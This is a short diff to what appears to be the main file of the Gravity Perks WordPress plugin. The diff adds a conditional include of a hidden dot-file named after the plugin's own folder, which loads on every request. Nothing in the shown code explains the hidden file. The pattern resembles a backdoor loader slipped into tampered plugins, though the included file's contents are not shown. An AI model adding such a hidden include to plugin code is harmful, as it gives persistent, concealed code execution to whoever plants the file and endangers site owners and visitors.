@@ -22,6 +22,10 @@ require_once( plugin_dir_path( __FILE__ ) . 'model/perk.php' );
 add_action( 'init', array( 'GravityPerks', 'init' ) );
 add_action( 'gform_loaded', array( 'GravityPerks', 'init_perk_as_plugin_functionality' ) );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GravityPerks {
 
     public static $version = GRAVITY_PERKS_VERSION;
